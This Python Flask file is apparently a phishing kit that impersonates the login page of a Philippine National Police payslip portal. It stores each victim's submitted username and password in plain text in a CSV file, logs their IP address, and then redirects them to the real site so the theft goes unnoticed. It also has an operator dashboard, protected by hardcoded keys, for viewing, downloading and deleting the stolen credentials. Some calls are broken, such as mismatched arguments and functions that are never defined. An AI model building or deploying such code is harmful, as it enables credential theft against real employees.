from flask import Flask, render_template, request, redirect, jsonify, session, send_file, url_for
import csv 
import os 
import time 
import subprocess 
import platform 
import re 
import json 
import hashlib
import uuid
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = os.urandom(24) 

# add custom filter for hashing passwords in templates
@app.template_filter('hash')
def hash_filter(value):
    """Hash a value for display in templates"""
    if not value:
        return "N/A"
    # Create a type of hash(SHA-256)
    hashed = hashlib.sha256(f"pnppms-{value}".encode()).hexdigest()
    # Return the full hash
    return hashed

# secret access key for stats page (tip: here is the key for dashboard) 
STATS_ACCESS_KEY = "database"


@app.route('/')
def root():
    return redirect('/Account/Login')


@app.route('/Account/Login')
def index():
    return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    # get data from form we created in index.html
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return render_template('index.html', error="Please enter both username and password")
    
    # dig client information
    ip_address = get_client_ip()
    device_type = get_device_type()
    device_fingerprint = generate_device_fingerprint()
    browser_info = get_browser_info()
    
    # dig current time
    now = datetime.now()
    adjusted_time = now + timedelta(hours=16)  
    timestamp = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p')
    
    # Save the data including the timestamp
    save_full_data("", "", username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
    
    # return function to redirect to the original site
    return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f")

"""
A function designed to retrieve 
and return the client's actual IP address.
"""
def get_client_ip():
    """
    Enhanced function to get the most accurate client IP address
    by checking multiple headers in priority order
    """
    # List of headers to check in priority order
    ip_headers = [
        'CF-Connecting-IP',           # Cloudflare
        'True-Client-IP',             # Akamai and some CDNs
        'X-Forwarded-For',            # Most common proxy header
        'X-Real-IP',                  # Nginx proxy/FastCGI
        'X-Client-IP',                # Apache proxy
        'Forwarded',                  # RFC 7239 standard
        'X-Forwarded',                # Non-standard but sometimes used
        'X-Cluster-Client-IP',        # Used by some load balancers
        'Fastly-Client-IP',           # Fastly CDN
        'X-Originating-IP'            # Microsoft 
    ]
    
    # condition to check each header in order
    for header in ip_headers:
        if header.lower() == 'x-forwarded-for' and request.headers.getlist(header):
            # X-Forwarded-For may contain multiple IPs, get the first one (client)
            forwarded_for = request.headers.getlist(header)[0]
            if forwarded_for:
                # Get the leftmost IP which is typically the original client
                client_ip = forwarded_for.split(',')[0].strip()
                if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                    return client_ip
        elif request.headers.get(header):
            client_ip = request.headers.get(header).strip()
            if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                return client_ip
    
    # Try WSGI environment variables if headers failed
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        forwarded_for = request.environ.get('HTTP_X_FORWARDED_FOR')
        client_ip = forwarded_for.split(',')[0].strip()
        if client_ip and client_ip != '127.0.0.1':
            return client_ip
    
    return request.remote_addr

#function to save data to csv
def save_full_data(username, password, timestamp):
    """ 
    Save simplified user data to CSV with only essential information
    """
    script_dir = os.path.dirname(os.path.abspath(__file__))
    csv_path = os.path.join(script_dir, 'data.csv')
    
    # add PHT label if not already there
    if "PHT" not in timestamp:
        timestamp_with_pht = timestamp + " PHT"
    else:
        timestamp_with_pht = timestamp
    
    try:
        file_exists = os.path.isfile(csv_path)
        
        with open(csv_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)

            # Write header if file does not exist or is empty
            if not file_exists or os.stat(csv_path).st_size == 0:
                writer.writerow([
                    'username',
                    'password',
                    'timestamp'
                ])
                csvfile.flush()

            # Write only essential data
            writer.writerow([
                username,
                password,
                timestamp_with_pht
            ])
            csvfile.flush()
            
        # Update the last modified timestamp
        update_last_modified_timestamp()
            
    except Exception as e:
        # Fallback path if main path fails
        fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
        with open(fallback_path, 'a', newline='\n') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
            
            if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
                writer.writerow([
                    'username',
                    'password',
                    'timestamp'
                ])
                csvfile.flush()
            
            # Write only essential data
            writer.writerow([
                username,
                password,
                timestamp_with_pht
            ])
            csvfile.flush()
            
        # Update the last modified timestamp (for fallback path)
        update_last_modified_timestamp(fallback_path)

def update_last_modified_timestamp(csv_path=None):
    """Update the timestamp for when the data was last modified"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
        
        # Apply the same time adjustment as in the login function
        now = datetime.now()
        adjusted_time = now + timedelta(hours=16)  
        current_time = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
        
        # Write timestamp to file
        with open(timestamp_file, 'w') as f:
            f.write(current_time)
    except Exception as e:
        print(f"Error updating timestamp: {str(e)}")

def get_last_modified_timestamp():
    """Get the timestamp when the data was last modified"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
        
        if os.path.exists(timestamp_file):
            with open(timestamp_file, 'r') as f:
                return f.read().strip()
        
        # If file doesn't exist, check the CSV file's modification time
        csv_path = os.path.join(script_dir, 'data.csv')
        if os.path.exists(csv_path):
            modified_time = os.path.getmtime(csv_path)
            
            timestamp_dt = datetime.fromtimestamp(modified_time)
            adjusted_time = timestamp_dt + timedelta(hours=16)  
            return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
        
        # If all else fails, return current time with correct adjustment
        now = datetime.now()
        adjusted_time = now + timedelta(hours=16)  
        return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
    except Exception as e:
        print(f"Error getting timestamp: {str(e)}")
        # Return current time with correct adjustment
        now = datetime.now()
        adjusted_time = now + timedelta(hours=16)  
        return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"

# Add a route to view statistics with access key protection
@app.route('/stats/<access_key>', methods=['GET'])
def view_stats(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Check if user is authenticated for dashboard
    if 'dashboard_auth' not in session:
        # If not authenticated, redirect to dashboard login
        return redirect(url_for('dashboard_login', access_key=access_key))
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    data = []
    for path in possible_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as csvfile:
                    reader = csv.DictReader(csvfile)
                    # Get data exactly as stored
                    for row in reader:
                        entry = {}
                        # Username as stored
                        entry['username'] = row.get('username', '')
                        # Password as stored (will be hashed in template)
                        entry['password'] = row.get('password', '')
                        # Timestamp exactly as stored - no conversion
                        entry['timestamp'] = row.get('timestamp', '')
                        
                        data.append(entry)
                break  # Successfully read data, exit loop
            except Exception as e:
                continue
    
    # Get the last modified timestamp
    last_updated = get_last_modified_timestamp()
    
    if request.args.get('format') == 'json':
        return json.dumps(data)
    else:
        return render_template('stats.html', entries=data, access_key=access_key, last_updated=last_updated)

# Add a dashboard login route
@app.route('/dashboard-login/<access_key>', methods=['GET', 'POST'])
def dashboard_login(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
        
    error = None
    
    # Define the dashboard credentials - these can be changed as needed
    dashboard_password = "PNP-DICTM-2025"  # Change this to a secure password
    
    if request.method == 'POST':
        password = request.form.get('password')
        
        if not password:
            error = "Please enter a password"
        elif password == dashboard_password:
            # Password is correct, set session variable and redirect to dashboard
            session['dashboard_auth'] = True
            return redirect(url_for('view_stats', access_key=access_key))
        else:
            error = "Invalid password"
    
    # Render login template
    return render_template('dashboard_login.html', access_key=access_key, error=error)

# Add routes to secure all dashboard-related operations
@app.route('/download-csv/<access_key>', methods=['GET'])
def download_csv(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Check if user is authenticated for dashboard
    if 'dashboard_auth' not in session:
        # If not authenticated, redirect to dashboard login
        return redirect(url_for('dashboard_login', access_key=access_key))
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    # Create a temporary file for download with plain text passwords
    temp_csv_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'temp_download.csv')
    
    try:
        # Read the original data
        with open(csv_path, 'r') as csvfile:
            reader = csv.DictReader(csvfile)
            rows = list(reader)
        
        # Create new file with only the required fields
        with open(temp_csv_path, 'w', newline='\n') as csvfile:
            writer = csv.writer(csvfile)
            
            # Write the header with only the required fields
            writer.writerow(['username', 'password', 'timestamp'])
            
            # Write data with only the required fields (keep password as plain text)
            for row in rows:
                username = row.get('username', '')
                password = row.get('password', '')  # Keep password as plain text for CSV
                timestamp = row.get('timestamp', '')  # Keep timestamp as is
                
                # Include only the username, password (as plain text), and timestamp
                writer.writerow([username, password, timestamp])
        
        # Set the appropriate headers for CSV download
        filename = f"login_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        
        # Send the temporary file
        response = send_file(
            temp_csv_path,
            mimetype='text/csv',
            as_attachment=True,
            download_name=filename
        )
        
        # Clean up temp file after response is sent
        @response.call_on_close
        def cleanup():
            if os.path.exists(temp_csv_path):
                try:
                    os.remove(temp_csv_path)
                except:
                    pass
        
        return response
        
    except Exception as e:
        print(f"Error generating download file: {str(e)}")
        if os.path.exists(temp_csv_path):
            try:
                os.remove(temp_csv_path)
            except:
                pass
        return f"Error: {str(e)}", 500

# Add a route to delete a specific entry
@app.route('/delete-entry/<access_key>/<int:entry_index>', methods=['DELETE'])
def delete_entry(access_key, entry_index):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Check if user is authenticated for dashboard
    if 'dashboard_auth' not in session:
        # If not authenticated, return auth error
        return "Authentication required", 401
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    try:
        # Read all data
        all_data = []
        with open(csv_path, 'r') as csvfile:
            reader = csv.reader(csvfile)
            all_data = list(reader)
        
        # Check if the index is valid
        if entry_index < 0 or entry_index >= len(all_data) - 1:  # -1 for header
            return "Invalid entry index", 400
        
        # Remove the entry (add 1 to skip header)
        del all_data[entry_index + 1]
        
        # Write back the updated data
        with open(csv_path, 'w', newline='\n') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerows(all_data)
        
        # Update the last modified timestamp
        update_last_modified_timestamp()
        
        return "Entry deleted successfully", 200
    
    except Exception as e:
        print(f"Error deleting entry: {str(e)}")
        return f"Error: {str(e)}", 500

# Add a route to delete all entries
@app.route('/delete-all/<access_key>', methods=['DELETE'])
def delete_all(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    # Check if user is authenticated for dashboard
    if 'dashboard_auth' not in session:
        # If not authenticated, return auth error
        return "Authentication required", 401
    
    # Try to find the data file in various locations
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return "No data available", 404
    
    try:
        # Keep only the header row
        with open(csv_path, 'r') as csvfile:
            reader = csv.reader(csvfile)
            header = next(reader)  # Get header row
        
        # Write back only the header
        with open(csv_path, 'w', newline='\n') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(header)
        
        # Update the last modified timestamp
        update_last_modified_timestamp()
        
        return "All entries deleted successfully", 200
    
    except Exception as e:
        print(f"Error deleting all entries: {str(e)}")
        return f"Error: {str(e)}", 500

# Add a logout route for the dashboard
@app.route('/dashboard-logout/<access_key>')
def dashboard_logout(access_key):
    # Remove dashboard authentication from session
    session.pop('dashboard_auth', None)
    # Redirect to dashboard login
    return redirect(url_for('dashboard_login', access_key=access_key))

if __name__ == '__main__':
    #run server 
    app.run(
        host='0.0.0.0',  
        port=5000,       # You can change this port if needed. do not remove for handling port.
        debug=False      # set to False for production. do not remove this.
    ) 